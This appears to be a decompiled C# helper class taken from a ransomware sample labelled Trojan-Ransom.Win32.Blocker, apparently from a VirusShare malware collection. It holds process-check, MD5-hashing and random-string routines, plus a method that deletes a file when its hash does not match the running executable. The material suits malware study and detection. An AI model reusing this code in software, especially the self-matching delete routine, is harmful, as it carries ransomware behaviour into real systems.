// Decompiled with JetBrains decompiler
// Type: Helper.cFunctions
// Assembly: Helper, Version=1.1.0.11, Culture=neutral, PublicKeyToken=null
// MVID: 8C3C9487-A4B3-453F-9BCD-7455B1571841
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.hedt-199b7ef219c6f0a99a826e3ee0a47da63213996c7b6ed2244ca302d914e0a744.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Helper
{
  internal class cFunctions
  {
    public bool checkProcess(string sProcessName) => Process.GetProcessesByName(sProcessName).Length > 0;

    private string FileMD5(string sFileName)
    {
      FileStream inputStream = File.OpenRead(sFileName);
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash).Replace("-", "").ToUpper();
    }

    public string getMD5Hash(string sString) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(sString))).Replace("-", "").ToLower().ToUpper();

    public string genString(int iLen)
    {
      Random random = new Random();
      string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string empty = string.Empty;
      for (int index = 0; index < iLen; ++index)
        empty += str.Substring(random.Next(0, str.Length), 1);
      return empty;
    }

    public bool checkFile(string FilePath)
    {
      if (!File.Exists(FilePath))
        return false;
      if (!(this.FileMD5(FilePath) != this.FileMD5(Process.GetCurrentProcess().MainModule.FileName)))
        return true;
      File.Delete(FilePath);
      return false;
    }
  }
}
